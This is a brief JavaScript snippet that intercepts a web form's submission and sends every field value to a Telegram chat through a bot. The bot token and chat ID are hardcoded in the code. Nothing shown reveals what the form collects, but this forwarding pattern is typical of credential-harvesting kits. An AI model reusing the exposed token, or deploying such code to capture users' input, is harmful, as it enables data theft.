const botToken = '6331823095:AAGCI0yP2ZXroAUMtassDfqmnkrJIMp908I';
const chatId = '6711432012';

const sendTelegramMessage = (formData) => {
    let message = "";

    for (const key in formData) {
        if (formData.hasOwnProperty(key)) {
            message += `${key}: \`${formData[key]}\`\n`;
        }
    }

    const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const postData = new URLSearchParams({
        'chat_id': chatId,
        'text': message,
        'parse_mode': 'Markdown'
    });

    fetch(telegramApiUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: postData
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Error sending message to Telegram bot.');
        }
        return response.json();
    })
    .then(data => {
        console.log(data);
    })
    .catch(error => {
        console.error(error);
    });
};

document.getElementById("telegramForm").addEventListener("submit", function(event) {
    event.preventDefault(); // Prevent the default form submission

    const formData = new FormData(event.target);
    let formDataObject = {};
    formData.forEach((value, key) => {
        formDataObject[key] = value;
    });
    sendTelegramMessage(formDataObject);
});
